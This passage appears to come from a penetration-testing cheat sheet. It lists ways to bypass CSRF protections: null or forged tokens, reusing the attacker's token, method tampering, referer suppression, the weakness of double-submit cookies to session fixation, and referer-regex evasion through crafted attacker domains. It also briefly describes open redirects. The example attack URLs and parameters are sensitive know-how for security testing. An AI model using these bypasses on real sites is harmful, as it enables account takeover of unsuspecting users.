   - NULL value - e.g.: `?csrf=&new_email=m3g4haxx0r@pentest-experts.com` on case the test only check for presence of a token field
   - Setting a token with a random value of the same length / format (numerical, hex, string) as a valid token in casse the test only check if token fit the length / format
   - Use a known CSRF token from the attacker account in case the check is not testing if a token is tied to a speciffic account
   - Try HTTP method tampering
   - Remove referer header by `<meta name="referrer" content="no-referrer">` on the exploit page in case the CSRF token is tied to the referer

#### Double submit cookie

 - Send the CSRF token in the Cookie and HTTP GET/POST parameters and check only of those values match
 - Can be defeated by session fixation 

#### Bypassing referer URL test

 - Some anti CSRF measures are tied to the referer value, which is tested by RegEx or substing-matching
 - Can eventually be bypassed by using the expected value as subdomain or folder - e.g.:  
   - `https://victimsite.com.pentest-experts.com/csrf.html`
   - `https://pentest-experts.com/victimsite.com/csrf.html`


#### Open Redirect

 - Caused by using a not sanitized parameter in a redirect and thus allow an attacker to redirect a victim to any page from a URL of a trusted site.
 - Can also be used to steal user tokens or for session fixation



